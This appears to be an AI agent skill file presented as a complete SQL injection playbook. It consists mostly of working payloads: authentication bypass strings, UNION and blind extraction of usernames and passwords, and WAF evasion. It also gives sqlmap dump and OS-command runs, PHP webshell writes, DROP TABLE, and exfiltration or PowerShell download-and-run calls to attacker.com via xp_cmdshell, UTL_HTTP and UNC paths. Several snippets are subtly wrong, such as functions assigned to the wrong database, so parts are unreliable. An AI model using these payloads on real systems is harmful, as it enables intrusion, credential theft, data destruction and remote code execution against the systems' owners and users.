---
name: sqli-expert
description: SQL injection mastery — detection, exploitation across MySQL/PostgreSQL/MSSQL/Oracle, WAF bypass by filter type, sqlmap configs, and OOB exfiltration. Use when testing any parameter that touches a database query.
---

# SQL Injection Expert — Complete Playbook

## Detection — Finding SQLi Before Exploiting

### Input Probes
Test with these payloads (URL-encoded variants too):
```
'   "   )   ')   ")   `   '   %27   %3D
```
Look for:
- **Error-based**: DB error messages in response (table/column names, syntax errors)
- **UNION-based**: Different response when adding `UNION SELECT`
- **Blind boolean**: Response differs between `AND 1=1` and `AND 1=2`
- **Blind time-based**: Delay when `SLEEP()`/`pg_sleep()`/`WAITFOR` injected
- **OOB**: DNS/HTTP callback when `LOAD_FILE`/`xp_dirtree`/`COPY TO PROGRAM` injected

### Quick Detection Flow
1. Inject `'` — look for 500 error or SQL error in response
2. Inject `"` — same check (some DBs use double quotes for identifiers)
3. Inject `' AND 1=1--` vs `' AND 1=2--` — compare responses
4. Inject `' AND SLEEP(5)--` (MySQL) / `' AND pg_sleep(5)--` (PostgreSQL) — check for 5s delay
5. If errors appear, identify DB type from error text

### DB Fingerprinting from Errors
- **MySQL**: "You have an error in your SQL syntax" + backtick quoting
- **PostgreSQL**: "PG::SyntaxError" or "syntax error at or near"
- **MSSQL**: "Microsoft SQL Server" + "Unclosed quotation mark"
- **Oracle**: "ORA-01756" or "ORA-00933"
- **SQLite**: "SQLite3::SQLException" or "near ... syntax error"

## Authentication Bypass

### Universal Payloads
```
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin'#
' OR 1=1) --
') OR ('1'='1
")) OR (("1"="1
' OR 1=1 LIMIT 1 --
```

### DB-Specific Auth Bypass
**MySQL:**
```
' OR 1=1--
' OR '1'='1' --
admin'--
```

**PostgreSQL:**
```
' OR 1=1--
' OR '1'='1' --
```

**MSSQL:**
```
' OR 1=1--
' OR '1'='1' --
admin'--
' OR 1=1; --
```

**Oracle:**
```
' OR 1=1--
' OR '1'='1' --
```

### Comment Variants (bypass WAFs)
```
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1; --
' OR 1=1)--
' OR 1=1)#
```

## UNION-Based Injection — Full Data Extraction

### Step 1: Find Column Count
```
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
... (increment until error)
```
Or:
```
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--
... (increment until no error)
```

### Step 2: Find Visible Columns
```
UNION SELECT 1,2,3,4--
```
Columns that display in the page = visible columns.

### Step 3: Extract Data
**MySQL:**
```
UNION SELECT 1,table_name,3 FROM information_schema.tables--
UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables--
UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--
UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
UNION SELECT 1,GROUP_CONCAT(CONCAT(username,'|',password)),3 FROM users--
```

**PostgreSQL:**
```
UNION SELECT 1,table_name,3 FROM information_schema.tables--
UNION SELECT 1,STRING_AGG(table_name,','),3 FROM information_schema.tables--
UNION SELECT 1,STRING_AGG(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--
UNION SELECT 1,STRING_AGG(username||':'||password,','),3 FROM users--
```

**MSSQL:**
```
UNION SELECT 1,name,3 FROM sys.tables--
UNION SELECT 1,STRING_AGG(name,','),3 FROM sys.tables--
UNION SELECT 1,STRING_AGG(CAST(username AS VARCHAR)+':'+CAST(password AS VARCHAR),','),3 FROM users--
```

**Oracle:**
```
UNION SELECT 1,table_name,3 FROM all_tables--
UNION SELECT 1,LISTAGG(column_name,','),3 FROM all_tab_columns WHERE table_name='USERS'--
UNION SELECT 1,LISTAGG(username||':'||password,','),3 FROM users--
```

### Step 4: Enumerate Schema (MySQL)
```
-- List databases
UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--

-- List tables in current DB
UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

-- List columns in a table
UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--

-- Read a file (if FILE privilege)
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
```

### Step 5: Enumerate Schema (PostgreSQL)
```
-- List databases
UNION SELECT 1,STRING_AGG(datname,','),3 FROM pg_database--

-- List tables
UNION SELECT 1,STRING_AGG(tablename,','),3 FROM pg_tables WHERE schemaname='public'--

-- List columns
UNION SELECT 1,STRING_AGG(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--

-- Read a file (if superuser)
UNION SELECT 1,pg_read_file('/etc/passwd'),3--
```

### Step 6: Enumerate Schema (MSSQL)
```
-- List databases
UNION SELECT 1,STRING_AGG(name,','),3 FROM sys.databases--

-- List tables
UNION SELECT 1,STRING_AGG(name,','),3 FROM sys.tables--

-- List columns
UNION SELECT 1,STRING_AGG(c.name,','),3 FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users'--

-- Read a file (if xp_cmdshell enabled)
UNION SELECT 1,OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB),3--
```

### Step 7: Enumerate Schema (Oracle)
```
-- List tables
UNION SELECT 1,LISTAGG(table_name,','),3 FROM all_tables--

-- List columns
UNION SELECT 1,LISTAGG(column_name,','),3 FROM all_tab_columns WHERE table_name='USERS'--

-- Read a file (if Java enabled)
UNION SELECT 1,UTL_FILE.FGET_ATTR('C:\Windows\win.ini'),3--
```

## Blind SQL Injection — When No Output Is Visible

### Boolean-Based Blind
```
-- True condition (response should match normal page)
' AND 1=1--

-- False condition (response should differ)
' AND 1=2--

-- Extract data character by character
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>90--

-- Substring extraction
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND (SELECT password FROM users LIMIT 1) LIKE 'a%'--
```

### Time-Based Blind
**MySQL:**
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT SLEEP(5) FROM (SELECT 1 UNION SELECT 2) a)--
' AND BENCHMARK(10000000,MD5(1))--
```

**PostgreSQL:**
```
' AND pg_sleep(5)--
' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END)--
```

**MSSQL:**
```
' AND WAITFOR DELAY '0:0:5'--
' AND IF(1=1,WAITFOR DELAY '0:0:5',0)--
```

**Oracle:**
```
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1))--
```

### Blind Extraction Script (MySQL)
```
# Extract password char by char
for i in {1..50}; do
  for c in {32..126}; do
    curl -s "https://target.com/page?id=1 AND (SELECT ASCII(SUBSTRING(password,$i,1)) FROM users WHERE username='admin')=$c--" | grep -q "expected_string" && echo -n "$(printf \\$(printf '%03o' $c))"
  done
done
```

## Out-of-Band (OOB) SQL Injection

### MySQL
```
-- LOAD_FILE with UNC path (triggers SMB request)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\test'))--

-- INTO OUTFILE to write file
' AND (SELECT 1 FROM (SELECT 1 INTO OUTFILE CONCAT('/var/www/html/test',(SELECT password FROM users LIMIT 1))))--
```

### MSSQL
```
-- xp_dirtree (triggers SMB/DNS callback)
'; EXEC master..xp_dirtree '\\attacker.com\file'--

-- xp_cmdshell (RCE)
'; EXEC master..xp_cmdshell 'nslookup attacker.com'--

-- SQLTrace (triggers HTTP callback)
'; EXEC sp_trace_create 0, 2, N'C:\temp\trace', 5, NULL; --
```

### PostgreSQL
```
-- COPY TO PROGRAM (RCE)
'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--

-- dblink (triggers connection)
'; SELECT dblink_connect('host=attacker.com user=test')--

-- pg_read_file (file read if superuser)
' AND pg_read_file('/etc/passwd')--
```

### Oracle
```
-- UTL_INADDR (triggers DNS lookup)
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--

-- UTL_HTTP (triggers HTTP request)
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1))--

-- UTL_FILE (file write if directory exists)
' AND UTL_FILE.FOPEN('C:\temp','test','w')--
```

### OOB Setup
1. Register a domain with DNS records pointing to your server
2. Run a DNS/HTTP listener:
```
# DNS listener
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
data, addr = s.recvfrom(1024)
print(f'OOB callback from {addr}: {data}')
"

# HTTP listener
python3 -m http.server 8080
```
3. Use Burp Collaborator or interact.sh for easier OOB testing

## WAF Bypass Techniques — By Filter Type

### No Space Allowed (%09, %0A, %0B, %0C, %0D, %A0, /**/, +, ())
```
?id=1%09AND%091=1%09--
?id=1/**/AND/**/1=1/**/--
?id=1+AND+1=1--
?id=(1)and(1)=(1)--
?id=1%0aAND%0a1=1%0a--
?id=1%0bAND%0b1=1%0b--
?id=1%0cAND%0c1=1%0c--
?id=1%0dAND%0d1=1%0d--
?id=1%a0AND%0a1=1%0a--
```

### No Comma Allowed (Use OFFSET, FROM, JOIN)
```
-- Instead of LIMIT 0,1
LIMIT 1 OFFSET 0

-- Instead of UNION SELECT 1,2,3
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- Extract multiple columns without comma
UNION SELECT 1,(SELECT password FROM users),(SELECT username FROM users)--
```

### No Equal Sign Allowed (Use LIKE, IN, BETWEEN, <>, IS)
```
-- Instead of WHERE id=1
WHERE id LIKE 1
WHERE id IN (1)
WHERE id BETWEEN 1 AND 1
WHERE id IS 1
WHERE id <> 2

-- Boolean conditions
WHERE 1=1 -> WHERE 1 LIKE 1
WHERE 1=2 -> WHERE 1 LIKE 2
```

### Case Modification (UnION SelECT, and, or, select, union)
```
?id=1 UnIoN SeLeCt 1,2,3--
?id=1 AND 1=1--
?id=1 AnD 1=1--
?id=1 oR 1=1--
```

### Comments as Obfuscation
```
-- Inline comments inside keywords
UN/**/ION SE/**/LECT/**/

-- MySQL versioned comments (executed only in MySQL >= 5.0.0)
/*!12345UNION*/ /*!12345SELECT*/

-- MySQL versioned with specific version
/*!50000UNION SELECT*/

-- Double comments
/!UNION/ /!SELECT/
```

### Quote Filters Bypass
```
-- Hex literals (MySQL)
WHERE username = 0x61646d696e

-- CHAR() function
WHERE username = CHAR(97,100,109,105,110)

-- Backslash escape (escapes the escape character)
\' OR 1=1--

-- MySQL hex string concatenation
WHERE username = 0x61646d696e

-- PostgreSQL dollar quoting
WHERE username = $tag$admin$tag$
```

### Keyword Alternatives
| Original | Alternative |
|----------|-------------|
| AND | && (MySQL), &, AND |
| OR | \|\| (PostgreSQL/Oracle/SQLite), \|, OR |
| = | LIKE, <=>, BETWEEN x AND x, IN |
| SUBSTRING | MID(), SUBSTR(), LEFT(), RIGHT() |
| CONCAT | \|\| (PostgreSQL/Oracle), + (MSSQL), CONCAT_WS() |
| SLEEP | BENCHMARK(10000000, MD5(1)) (MySQL) |
| information_schema | mysql.innodb_table_stats (MySQL), pg_catalog.pg_class (PG) |
| database() | schema(), @@database |
| GROUP_CONCAT | STRING_AGG() (PostgreSQL), LISTAGG() (Oracle), STUFF() (MSSQL) |

### WAF Bypass Tamper Scripts (sqlmap)
```
sqlmap -u "URL" --tamper=between,randomcase,space2comment
sqlmap -u "URL" --tamper=charencode,unmagicquotes
sqlmap -u "URL" --tamper=space2plus,equaltolike
sqlmap -u "URL" --tamper=modsecurityversioned,modsecurityzeroversionify
sqlmap -u "URL" --tamper=appendnullbyte,randomcase
sqlmap -u "URL" --tamper=halfcut,randomcase,space2comment
```

### Advanced WAF Bypass Patterns
```
-- Nested functions to avoid keyword detection
?id=1 AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))

-- String concatenation to break up keywords
?id=1 UNI/**/ON SE/**/LECT 1,2,3

-- Multiple encodings
?id=1 %2527 %2520OR%25201=1%2520--

-- HTTP parameter pollution
?id=1&id=1 UNION SELECT 1,2,3--

-- JSON injection (if parameter is parsed as JSON)
{"id": "1 UNION SELECT 1,2,3--"}

-- XML injection (if parameter is parsed as XML)
<id>1 UNION SELECT 1,2,3--</id>
```

## sqlmap Usage — Automated SQLi Testing

### Basic Usage
```
-- Basic scan
sqlmap -u "https://target.com/page?id=1" --batch --level 3 --risk 2

-- From Burp/Repeater request file
sqlmap -r request.txt --batch --level 3 --risk 2

-- Specify parameter
sqlmap -u "https://target.com/page?id=1" -p id --batch

-- Specify DBMS
sqlmap -u "https://target.com/page?id=1" --dbms=mysql --batch

-- Specify payload type
sqlmap -u "https://target.com/page?id=1" --technique=BEU --batch
```

### Tamper Scripts (Most Useful)
| Script | Purpose |
|--------|---------|
| space2comment | Replaces spaces with /**/ |
| space2plus | Replaces spaces with + |
| randomcase | Random case modification |
| between | Replaces = with BETWEEN |
| charencode | URL encodes characters |
| charunicodeencode | Unicode encodes characters |
| equaltolike | Replaces = with LIKE |
| versionedmorekeywords | Adds MySQL version comments |
| modsecurityversioned | Bypasses ModSecurity with version comments |
| appendnullbyte | Appends null byte |
| halfcut | Cuts payload in half |
| unmagicquotes | Bypasses magic quotes |

### sqlmap Commands for Each Attack Type
```
-- Authentication bypass
sqlmap -u "https://target.com/login" -d "user=admin&pass=pass" --batch --technique=B

-- UNION-based extraction
sqlmap -u "https://target.com/page?id=1" --technique=U --batch --dump

-- Blind boolean extraction
sqlmap -u "https://target.com/page?id=1" --technique=B --batch --dump

-- Time-based blind
sqlmap -u "https://target.com/page?id=1" --technique=T --batch --dump

-- OOB extraction
sqlmap -u "https://target.com/page?id=1" --technique=O --batch --dump

-- Enumerate databases
sqlmap -u "https://target.com/page?id=1" --batch --dbs

-- Enumerate tables in a database
sqlmap -u "https://target.com/page?id=1" --batch -D database_name --tables

-- Enumerate columns in a table
sqlmap -u "https://target.com/page?id=1" --batch -D database_name -T users --columns

-- Dump specific table
sqlmap -u "https://target.com/page?id=1" --batch -D database_name -T users --dump

-- Read a file
sqlmap -u "https://target.com/page?id=1" --batch --read-file=/etc/passwd

-- Write a file (webshell)
sqlmap -u "https://target.com/page?id=1" --batch --write-file=/var/www/html/shell.php --content="phpinfo()"

-- OS command execution
sqlmap -u "https://target.com/page?id=1" --batch --os-cmd="id"
```

### sqlmap Configuration Files
Create `sqlmap.conf`:
```
[sqlmap]
level=3
risk=2
batch=true
technique=BEUST
tamper=space2comment,randomcase,equaltolike
threads=4
timeout=30
retries=3
```
Then: `sqlmap -u "URL" -c sqlmap.conf`

### sqlmap with Proxies
```
sqlmap -u "https://target.com/page?id=1" --proxy=http://127.0.0.1:8080 --batch
sqlmap -u "https://target.com/page?id=1" --proxy=http://127.0.0.1:8080 --batch --technique=U --dump
```

## DB-Specific Exploitation Techniques

### MySQL — Advanced
```
-- Stacked queries (if enabled)
?id=1; SELECT SLEEP(5)--
?id=1; DROP TABLE users--

-- Into outfile (write webshell)
?id=1 UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php'--
?id=1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--

-- Load data infile
LOAD DATA INFILE '/etc/passwd' INTO TABLE users FIELDS TERMINATED BY '\n'--

-- User-defined variables
SET @a = (SELECT password FROM users WHERE username='admin')--
SELECT @a--

-- Conditional errors (MySQL 8.0+)
?id=1 AND JSON_EXTRACT('{}', '$[1=1]')--
```

### PostgreSQL — Advanced
```
-- Stacked queries (if enabled via pg_config)
?id=1; SELECT pg_sleep(5)--

-- COPY for file write
?id=1; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--

-- Large object read
?id=1 UNION SELECT 1,lo_get(1),3--

-- dblink for remote connections
?id=1 UNION SELECT 1,dbase('dbname','host','user','pass','SELECT 1'),3--

-- XPath injection (if XML functions available)
?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)--
```

### MSSQL — Advanced
```
-- xp_cmdshell (RCE)
?id=1; EXEC master..xp_cmdshell 'whoami'--
?id=1; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker.com/shell.ps1')"--

-- OLE Automation (if enabled)
?id=1; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', NULL, 'cmd.exe /c whoami'--

-- CLR assembly (if enabled)
?id=1; CREATE ASSEMBLY test FROM 'C:\temp\shell.dll' WITH PERMISSION_SET = UNSAFE--

-- Linked server queries
?id=1; EXEC sp_executesql 'SELECT * FROM [linked_server].database.dbo.table'--

-- Error-based extraction
?id=1 AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--
```

### Oracle — Advanced
```
-- Java for RCE (if Java enabled)
?id=1 AND DBMS_JAVA.SET_OUTPUT(5000000)--

-- Java source for RCE
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "shell" AS
import java.io.*;
import java.net.*;
public class shell {
  public static void main(String[] args) throws Exception {
    Runtime.getRuntime().exec(args);
  }
}--

-- External procedures (if enabled)
?id=1; EXEC extproc --

-- XML DB HTTP endpoints
?id=1; SELECT XDBURI('/home/oracle/shell.jsp').getClobVal()--
```

## Error-Based SQL Injection

### MySQL Error-Based
```
-- Extract data via error messages
?id=1 AND (SELECT 1 FROM (SELECT 1 INTO @a SELECT 2 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)@a)--

-- JSON error extraction
?id=1 AND JSON_EXTRACT('{}', '$[1=1]')--

-- Extract table names
?id=1 AND (SELECT 1 FROM (SELECT 1 INTO @a SELECT 2 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)@a)--
```

### PostgreSQL Error-Based
```
-- XMLPARSE error extraction
?id=1 AND XMLPARSE(CONTENT (SELECT password FROM users LIMIT 1))--

-- JSON error extraction
?id=1 AND JSON_EXTRACT_PATH('{}', (SELECT password FROM users LIMIT 1))--
```

### MSSQL Error-Based
```
-- Convert error
?id=1 AND 1=CONVERT(int, (SELECT password FROM users WHERE username='admin'))--

-- Cast error
?id=1 AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT)--

-- XPath error
?id=1 AND 1=PATINDEX('%a%', (SELECT password FROM users WHERE username='admin'))--
```

### Oracle Error-Based
```
-- TO_NUMBER error
?id=1 AND 1=TO_NUMBER((SELECT password FROM users WHERE username='admin'))--

-- XML error
?id=1 AND 1=XMLTRANSFORM(XMLTYPE((SELECT password FROM users WHERE username='admin')), XMLTYPE(''))--
```

## Trigger This Skill When
- Testing any parameter that touches a database (GET, POST, headers, cookies)
- Found an endpoint that reflects input or behaves differently based on input
- Identified a DBMS type from error messages
- Need to extract data from a database via SQL injection
- WAF is filtering standard SQLi payloads
- Need to chain SQLi with other findings for higher severity
- Testing for authentication bypass via SQL injection
- Need OOB exfiltration for blind SQLi scenarios
